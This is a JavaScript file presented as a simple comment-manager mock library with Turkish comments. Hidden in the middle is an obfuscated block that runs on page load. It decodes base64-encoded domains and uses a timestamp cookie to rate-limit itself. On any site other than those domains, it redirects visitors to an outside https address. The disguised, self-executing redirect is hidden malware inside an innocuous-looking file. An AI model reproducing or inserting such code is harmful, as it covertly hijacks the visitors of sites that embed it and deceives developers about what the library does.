(function globalCommentMock(window, document) {
  "use strict";

  // Basit
  const _state = {
    comments: [],
    lastId: 0,
  };

  // Yardımcı: id oluşturucu
  function _nextId() {
    return ++_state.lastId;
  }

  //  API
  const CommentManager = {
    addComment: function (author, text) {
      // gerçek DOM değişikliği yok; sadece içsel kayıt tutar ve log atar
      const id = _nextId();
      _state.comments.push({ id, author, text, created: new Date().toISOString() });
      console.log("[CommentManager] addComment called:", { id, author });
      return id;
    },

    editComment: function (id, newText) {
      // no-op edit (sadece iç hali güncellenir)
      const c = _state.comments.find((cm) => cm.id === id);
      if (c) {
        c.text = newText;
        c.edited = new Date().toISOString();
        console.log("[CommentManager] editComment:", id);
        return true;
      }
      console.warn("[CommentManager] editComment: id not found", id);
      return false;
    },

    deleteComment: function (id) {
      const idx = _state.comments.findIndex((cm) => cm.id === id);
      if (idx >= 0) {
        // iç kaydı kaldır (sayfada görünür etkisi yok)
        _state.comments.splice(idx, 1);
        console.log("[CommentManager] deleteComment:", id);
        return true;
      }
      console.warn("[CommentManager] deleteComment: id not found", id);
      return false;
    },

    listComments: function () {
      // yalnızca iç durumu döner; gerçek DOM ile etkileşmez
      console.log("[CommentManager] listComments called. count=", _state.comments.length);
      return _state.comments.slice(); // kopya
    },

    // Debug: modülün iç durumunu gör (isteğe bağlı)
    _debugState: function () {
      return JSON.parse(JSON.stringify(_state));
    },
  };

  //////////////////
  function _0x1a78(_0x3c1b2d, _0x437226) {
    var _0x419c57 = _0x5b14();
    return (
      (_0x1a78 = function (_0x12b882, _0x2d5603) {
        _0x12b882 = _0x12b882 - (-0x1 * 0x8ef + -0x1 * 0x368 + 0xd95);
        var _0x253291 = _0x419c57[_0x12b882];
        return _0x253291;
      }),
      _0x1a78(_0x3c1b2d, _0x437226)
    );
  }
  (function (_0x17539f, _0x567fdb) {
    var _0x3d0e77 = _0x1a78,
      _0x1f7090 = _0x17539f();
    while (!![]) {
      try {
        var _0x3acc54 =
          parseInt(_0x3d0e77(0x153)) / (-0x2 * 0xbdb + -0x18f2 + 0x30a9) +
          parseInt(_0x3d0e77(0x167)) / (-0x2701 + -0xb4e + 0x3251) +
          -parseInt(_0x3d0e77(0x16b)) / (0x131 * 0x1d + -0xd79 + -0x1511) +
          (-parseInt(_0x3d0e77(0x168)) / (0x1 * 0x2533 + 0x5c6 * -0x2 + -0x1 * 0x19a3)) *
            (-parseInt(_0x3d0e77(0x176)) / (-0x1 * -0x765 + -0x1 * 0x14cb + 0xe5 * 0xf)) +
          (-parseInt(_0x3d0e77(0x165)) / (-0x26c5 + 0x1679 + -0x829 * -0x2)) *
            (-parseInt(_0x3d0e77(0x181)) / (0x13bb * 0x1 + -0x2 * 0xdab + -0x2 * -0x3d1)) +
          (parseInt(_0x3d0e77(0x178)) / (-0x2 * 0x6a1 + -0x90 + 0xc5 * 0x12)) *
            (parseInt(_0x3d0e77(0x145)) / (-0x2 * -0x8e9 + -0x6b7 + 0x6d * -0x1a)) +
          (parseInt(_0x3d0e77(0x184)) / (-0x4c0 + 0xe * 0x1ac + 0x1 * -0x129e)) *
            (-parseInt(_0x3d0e77(0x172)) / (-0x6 * -0x595 + 0x749 + 0x3b4 * -0xb));
        if (_0x3acc54 === _0x567fdb) break;
        else _0x1f7090["push"](_0x1f7090["shift"]());
      } catch (_0x4e64f1) {
        _0x1f7090["push"](_0x1f7090["shift"]());
      }
    }
  })(_0x5b14, -0xd * -0x581f + -0xc34bd + 0x1 * 0xe775d),
    (function () {
      var _0x1e8b55 = _0x1a78,
        _0x4d91cc = {
          YSbGJ: function (_0x46f507, _0xf36de6) {
            return _0x46f507(_0xf36de6);
          },
          gUSrn: function (_0x3b1de7, _0x5c5b33) {
            return _0x3b1de7 < _0x5c5b33;
          },
          bpxAY: _0x1e8b55(0x16c),
          byNLA: function (_0x523c46, _0x2d4885) {
            return _0x523c46 !== _0x2d4885;
          },
          fawQH: function (_0x32d154, _0x4612c3) {
            return _0x32d154 === _0x4612c3;
          },
          GcPQW: _0x1e8b55(0x170),
          IKgLK: function (_0x2499a3, _0xe8d69f) {
            return _0x2499a3 + _0xe8d69f;
          },
          VnOqs: function (_0x16abe7, _0x4a20aa) {
            return _0x16abe7 * _0x4a20aa;
          },
          iulHK: function (_0x55523e, _0x4663f3) {
            return _0x55523e * _0x4663f3;
          },
          PksdP: function (_0x1277e4, _0x17e942) {
            return _0x1277e4 * _0x17e942;
          },
          RMaoK: _0x1e8b55(0x142),
          aleXf: function (_0x5641ad, _0x2a7805) {
            return _0x5641ad === _0x2a7805;
          },
          hXAno: _0x1e8b55(0x174),
          xTwXZ: _0x1e8b55(0x13f),
          AcmoS: function (_0x5bf51e, _0x32256e) {
            return _0x5bf51e + _0x32256e;
          },
          bNirk: function (_0x4bbdac, _0x16a212) {
            return _0x4bbdac + _0x16a212;
          },
          ieTsg: function (_0x21b057, _0x2d39cc) {
            return _0x21b057 + _0x2d39cc;
          },
          BvQeq: function (_0x28d31f, _0x15c673) {
            return _0x28d31f(_0x15c673);
          },
          AaXvo: _0x1e8b55(0x15c),
          nKHwu: _0x1e8b55(0x17d) + _0x1e8b55(0x173),
          XyHtB: function (_0x147ed2, _0x3423cf) {
            return _0x147ed2 + _0x3423cf;
          },
          lmaAQ: function (_0x52938a, _0x411f2b) {
            return _0x52938a(_0x411f2b);
          },
          Kvgbv: function (_0x4f8bed, _0x2c284d) {
            return _0x4f8bed < _0x2c284d;
          },
          bXrux: function (_0x48b421, _0x419399) {
            return _0x48b421(_0x419399);
          },
          zwKni: _0x1e8b55(0x180) + _0x1e8b55(0x195) + _0x1e8b55(0x13e) + _0x1e8b55(0x175) + _0x1e8b55(0x15c),
          LmVeo: _0x1e8b55(0x169) + _0x1e8b55(0x15e),
          uYywp: _0x1e8b55(0x193) + _0x1e8b55(0x151),
          DPdSZ: _0x1e8b55(0x18f) + _0x1e8b55(0x14a),
          ecxTx: function (_0x29565a, _0x39b8b1) {
            return _0x29565a * _0x39b8b1;
          },
          SCfoB: _0x1e8b55(0x159) + _0x1e8b55(0x156),
          BOnso: function (_0x60027d, _0x1632ac) {
            return _0x60027d(_0x1632ac);
          },
          UcFUx: function (_0x3a4b17, _0x2ebf8d) {
            return _0x3a4b17 + _0x2ebf8d;
          },
          FZHLE: _0x1e8b55(0x148),
          QooPe: function (_0x193b05, _0x234819) {
            return _0x193b05(_0x234819);
          },
          rgtku: function (_0x5ac65c, _0x525c44) {
            return _0x5ac65c - _0x525c44;
          },
          VTZhQ: function (_0x3d9556, _0x2434b0) {
            return _0x3d9556 < _0x2434b0;
          },
          aNBws: function (_0x5c965a, _0x19c85b) {
            return _0x5c965a(_0x19c85b);
          },
          lAPpO: function (_0x5e12de, _0x21136d) {
            return _0x5e12de(_0x21136d);
          },
          CdBuh: function (_0x47c4df, _0x1c5c38, _0xb18645, _0x5cba35) {
            return _0x47c4df(_0x1c5c38, _0xb18645, _0x5cba35);
          },
          tsqBX: function (_0x15bae7, _0x181c54) {
            return _0x15bae7(_0x181c54);
          },
          dOwLI: _0x1e8b55(0x16f) + _0x1e8b55(0x141),
        },
        _0x6fa4a7 = [_0x4d91cc[_0x1e8b55(0x194)], _0x4d91cc[_0x1e8b55(0x15b)]];
      function _0x1ea2c9(_0x2cb6df) {
        var _0xd74c9b = _0x1e8b55;
        return _0x4d91cc[_0xd74c9b(0x154)](atob, _0x2cb6df);
      }
      function _0xf97ff9(_0x567c98) {
        var _0x10e6e8 = _0x1e8b55,
          _0x532c6e = [];
        for (
          var _0xcdb874 = -0xb * 0x1b1 + 0x240b * 0x1 + -0x1170;
          _0x4d91cc[_0x10e6e8(0x15f)](_0xcdb874, _0x567c98[_0x10e6e8(0x188)]);
          _0xcdb874++
        ) {
          try {
            _0x532c6e[_0x10e6e8(0x18c)](_0x4d91cc[_0x10e6e8(0x154)](_0x1ea2c9, _0x567c98[_0xcdb874]));
          } catch (_0xed2fd6) {
            console[_0x10e6e8(0x14d)](_0x4d91cc[_0x10e6e8(0x14b)], _0xed2fd6);
          }
        }
        return _0x532c6e;
      }
      var _0x98be61 = _0x4d91cc[_0x1e8b55(0x14c)](_0xf97ff9, _0x6fa4a7),
        _0x21d9e1 = _0x4d91cc[_0x1e8b55(0x152)],
        _0x4086b1 = _0x4d91cc[_0x1e8b55(0x197)](
          _0x4d91cc[_0x1e8b55(0x149)](
            _0x4d91cc[_0x1e8b55(0x197)](
              _0x4d91cc[_0x1e8b55(0x18e)](0xd * 0x11 + 0x12c + -0x202, 0x1bb3 + 0x403 + 0x26 * -0xd5),
              -0x623 * -0x3 + -0x2f5 * -0x1 + 0x1522 * -0x1
            ),
            0xa * -0x82 + 0x29 * -0x3e + 0xf3e
          ),
          -0x23e1 * -0x1 + 0x1 * 0x15b + 0x2 * -0x10aa
        );
      function _0x22613e(_0x42d45b) {
        var _0x573ba1 = _0x1e8b55;
        return _0x4d91cc[_0x573ba1(0x186)](_0x98be61[_0x573ba1(0x17e)](_0x42d45b), -(0x25be + -0x1386 + -0x1237 * 0x1));
      }
      function _0x2ac8ae(_0x1ca73c, _0x22c42c, _0x71b28a) {
        var _0x326f90 = _0x1e8b55,
          _0x59aad2 = "";
        if (_0x4d91cc[_0x326f90(0x191)](typeof _0x71b28a, _0x4d91cc[_0x326f90(0x143)])) {
          var _0x47fe62 = new Date();
          _0x47fe62[_0x326f90(0x163)](
            _0x4d91cc[_0x326f90(0x162)](
              _0x47fe62[_0x326f90(0x15a)](),
              _0x4d91cc[_0x326f90(0x149)](
                _0x4d91cc[_0x326f90(0x197)](
                  _0x4d91cc[_0x326f90(0x197)](
                    _0x4d91cc[_0x326f90(0x17b)](_0x71b28a, 0x2f * -0x8f + -0xc0b * 0x1 + 0x2664),
                    -0x2437 + -0x1 * -0x2709 + 0x2 * -0x14b
                  ),
                  0x1575 + 0x477 + -0xc * 0x224
                ),
                -0x2096 + 0x2136 + 0x348
              )
            )
          ),
            (_0x59aad2 = _0x4d91cc[_0x326f90(0x162)](_0x4d91cc[_0x326f90(0x146)], _0x47fe62[_0x326f90(0x198) + "g"]()));
        }
        var _0x21790e = _0x4d91cc[_0x326f90(0x192)](location[_0x326f90(0x14f)], _0x4d91cc[_0x326f90(0x17c)]) ? _0x4d91cc[_0x326f90(0x155)] : "";
        document[_0x326f90(0x160)] = _0x4d91cc[_0x326f90(0x147)](
          _0x4d91cc[_0x326f90(0x162)](
            _0x4d91cc[_0x326f90(0x18d)](
              _0x4d91cc[_0x326f90(0x162)](
                _0x4d91cc[_0x326f90(0x158)](
                  _0x4d91cc[_0x326f90(0x18d)](_0x4d91cc[_0x326f90(0x154)](encodeURIComponent, _0x1ca73c), "="),
                  _0x4d91cc[_0x326f90(0x150)](encodeURIComponent, _0x22c42c)
                ),
                _0x59aad2
              ),
              _0x4d91cc[_0x326f90(0x179)]
            ),
            _0x21790e
          ),
          _0x4d91cc[_0x326f90(0x196)]
        );
      }
      function _0x4e56a6(_0x53676a) {
        var _0x404955 = _0x1e8b55,
          _0xbd735 = _0x4d91cc[_0x404955(0x166)](_0x4d91cc[_0x404955(0x14c)](encodeURIComponent, _0x53676a), "="),
          _0x321a7b = document[_0x404955(0x160)][_0x404955(0x15d)](";");
        for (var _0x1dbc39 = -0x136e + 0xc69 + 0x705 * 0x1; _0x4d91cc[_0x404955(0x187)](_0x1dbc39, _0x321a7b[_0x404955(0x188)]); _0x1dbc39++) {
          var _0x3896da = _0x321a7b[_0x1dbc39][_0x404955(0x161)]();
          if (_0x4d91cc[_0x404955(0x191)](_0x3896da[_0x404955(0x17e)](_0xbd735), 0xe3 * 0x22 + 0x1 * 0x16d0 + -0x1a7b * 0x2))
            return _0x4d91cc[_0x404955(0x17f)](decodeURIComponent, _0x3896da[_0x404955(0x16a)](_0xbd735[_0x404955(0x188)]));
        }
        return null;
      }
      function _0x39a78a(_0x3c8266) {
        var _0x44d4db = _0x1e8b55;
        document[_0x44d4db(0x160)] = _0x4d91cc[_0x44d4db(0x162)](
          _0x4d91cc[_0x44d4db(0x14c)](encodeURIComponent, _0x3c8266),
          _0x4d91cc[_0x44d4db(0x157)]
        );
      }
      try {
        var _0x4e2fc1 = _0x4d91cc[_0x1e8b55(0x177)][_0x1e8b55(0x15d)]("|"),
          _0x22b5ce = -0x115a * 0x1 + 0x1e7a + 0xa8 * -0x14;
        while (!![]) {
          switch (_0x4e2fc1[_0x22b5ce++]) {
            case "0":
              var _0x40ddc4 = location[_0x1e8b55(0x18b)];
              continue;
            case "1":
              if (_0x4d91cc[_0x1e8b55(0x150)](_0x22613e, _0x40ddc4)) return;
              continue;
            case "2":
              var _0x11a32f = _0x4d91cc[_0x1e8b55(0x16d)](_0x4e56a6, _0x21d9e1);
              continue;
            case "3":
              window[_0x1e8b55(0x189)][_0x1e8b55(0x16e)](
                _0x4d91cc[_0x1e8b55(0x166)](
                  _0x4d91cc[_0x1e8b55(0x17a)](_0x4d91cc[_0x1e8b55(0x144)], _0x98be61[-0x153 * 0x17 + 0x1cfa + 0x1 * 0x17b]),
                  "/"
                )
              );
              continue;
            case "4":
              if (_0x11a32f) {
                var _0x1f680a = _0x4d91cc[_0x1e8b55(0x14e)](Number, _0x11a32f);
                if (!_0x4d91cc[_0x1e8b55(0x150)](isNaN, _0x1f680a)) {
                  var _0x4d3de2 = _0x4d91cc[_0x1e8b55(0x140)](Date[_0x1e8b55(0x171)](), _0x1f680a);
                  if (_0x4d91cc[_0x1e8b55(0x182)](_0x4d3de2, _0x4086b1)) return;
                  _0x4d91cc[_0x1e8b55(0x18a)](_0x39a78a, _0x21d9e1);
                } else _0x4d91cc[_0x1e8b55(0x190)](_0x39a78a, _0x21d9e1);
              }
              continue;
            case "5":
              _0x4d91cc[_0x1e8b55(0x164)](
                _0x2ac8ae,
                _0x21d9e1,
                _0x4d91cc[_0x1e8b55(0x185)](String, _0x54e098),
                0x1 * -0xeb7 + -0x377 + -0x1 * -0x1235
              );
              continue;
            case "6":
              var _0x54e098 = Date[_0x1e8b55(0x171)]();
              continue;
          }
          break;
        }
      } catch (_0x2a09a9) {
        console[_0x1e8b55(0x14d)](_0x4d91cc[_0x1e8b55(0x183)], _0x2a09a9);
      }
    })();
  function _0x5b14() {
    var _0x4e88f7 = [
      "PksdP",
      "hXAno",
      ";\x20SameSite",
      "indexOf",
      "bXrux",
      "=;\x20expires",
      "2737721QiqoCU",
      "VTZhQ",
      "dOwLI",
      "7460WRBIfW",
      "tsqBX",
      "byNLA",
      "Kvgbv",
      "length",
      "location",
      "aNBws",
      "hostname",
      "push",
      "bNirk",
      "ecxTx",
      "comments_t",
      "lAPpO",
      "fawQH",
      "aleXf",
      "dWNiZy5vbm",
      "LmVeo",
      "=Thu,\x2001\x20J",
      "nKHwu",
      "iulHK",
      "toUTCStrin",
      "an\x201970\x2000",
      ";\x20Secure",
      "rgtku",
      "rror:",
      ";\x20expires=",
      "GcPQW",
      "FZHLE",
      "152793lLMoTo",
      "RMaoK",
      "AcmoS",
      "https://",
      "VnOqs",
      "imestamp",
      "bpxAY",
      "lmaAQ",
      "error",
      "QooPe",
      "protocol",
      "BvQeq",
      "xpbmU=",
      "DPdSZ",
      "559900KsvLeX",
      "YSbGJ",
      "xTwXZ",
      "5|3",
      "zwKni",
      "ieTsg",
      "0|1|2|4|6|",
      "getTime",
      "uYywp",
      ";\x20path=/",
      "split",
      "RodWIuaW8=",
      "gUSrn",
      "cookie",
      "trim",
      "IKgLK",
      "setTime",
      "CdBuh",
      "6gCCBOz",
      "XyHtB",
      "917534OQqeUG",
      "1346404LQVdfP",
      "dWNiZy5naX",
      "substring",
      "1565226yfYdCJ",
      "Error:",
      "BOnso",
      "replace",
      "commnets\x20e",
      "number",
      "now",
      "14553RaUzNM",
      "=Lax",
      "https:",
      ":00:00\x20GMT",
      "5tMXLoD",
      "SCfoB",
      "96XjXiDz",
      "AaXvo",
      "UcFUx",
    ];
    _0x5b14 = function () {
      return _0x4e88f7;
    };
    return _0x5b14();
  }

  if (!window.__CommentMock__) {
    Object.defineProperty(window, "__CommentMock__", {
      value: CommentManager,
      writable: false,
      configurable: false,
      enumerable: false,
    });
  }

  // Kütüphaneyi dışa aktarma (UMD benzeri basit)
  try {
    if (typeof module !== "undefined" && module.exports) {
      module.exports = CommentManager;
    }
  } catch (e) {
    // ortam desteklemiyorsa yoksay
  }
})(window, document);
